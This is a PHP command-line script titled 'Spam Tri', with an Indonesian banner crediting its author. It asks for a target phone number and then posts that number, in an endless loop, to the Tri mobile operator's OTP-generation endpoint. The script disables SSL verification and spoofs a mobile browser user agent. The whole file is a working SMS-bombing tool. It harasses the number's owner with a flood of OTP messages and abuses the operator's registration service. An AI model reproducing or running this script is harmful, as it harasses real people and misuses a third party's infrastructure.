<?php
system("clear");
system("figlet Spam Tri");
$banner = "\e[1;97m========================================\nAUTHOR:\e[1;92mFAHMIAPZ\n\e[1;97mYOUTUBE:\e[1;92mAPMZ CHANNEL\n\e[90mctrl+z Untuk Stop!!\n\e[1;97m========================================\n";
function sms($target) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://registrasi.tri.co.id/daftar/generateOTP");
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$target");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 9; in-id; SM-A107F Build/PPR1.180610.011) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16");
  $result = curl_exec($ch);
  curl_close($ch);
  $json = json_decode($result, true);
  sleep(0.1);  
  echo "\n\e[1;97m[\e[1;92mBerhasil\e[1;97m]", $json["success"], "\e[1;97m [\e[1;93mMengirim Sms Ke Nomor\e[1;97m]\e[1;91m:\e[1;97m", $json["MSISDN"];
}
echo $banner;
echo "\e[1;97m[\e[1;92mmasukan nomor\e[1;97m]\e[1;91m:\e[1;93m";
$nomor = trim(fgets(STDIN));
while (true) {
  $execute = sms($nomor);
  print $execute;
}
?>
